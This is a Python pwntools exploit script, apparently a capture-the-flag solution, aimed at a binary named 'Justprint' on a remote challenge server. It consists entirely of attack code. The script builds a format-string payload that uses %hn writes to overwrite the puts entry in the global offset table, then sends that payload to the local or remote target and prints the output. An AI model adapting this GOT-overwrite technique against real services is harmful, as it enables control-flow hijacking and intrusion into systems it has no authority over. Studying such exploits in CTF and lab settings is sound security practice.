import os

from pwn import *


HOST = "nc.umbccd.net"
PORT = 8925
HERE = os.path.dirname(__file__)
BIN_PATH = os.path.join(HERE, "Justprint")

context.binary = elf = ELF(BIN_PATH)


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BIN_PATH, cwd=HERE)


def build_payload():
    fmt = b"%64c%9$hn%4438c%10$hn"
    return flat(
        fmt.ljust(24, b"A"),
        p64(elf.got["puts"] + 2),
        p64(elf.got["puts"]),
    )


def main():
    io = conn()
    io.sendline(build_payload())
    data = io.recvall(timeout=2)
    print(data.decode("latin-1", errors="replace"))


if __name__ == "__main__":
    main()
